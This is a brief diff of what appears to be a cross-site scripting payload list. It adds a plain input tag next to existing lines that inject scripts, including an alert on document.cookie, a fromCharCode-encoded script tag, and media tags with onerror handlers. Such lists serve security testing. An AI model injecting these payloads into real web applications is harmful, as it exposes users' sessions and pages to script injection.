@@ -659,3 +659,4 @@ foo\’; alert(document.cookie);//’;
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
+<input type="text" size="40">
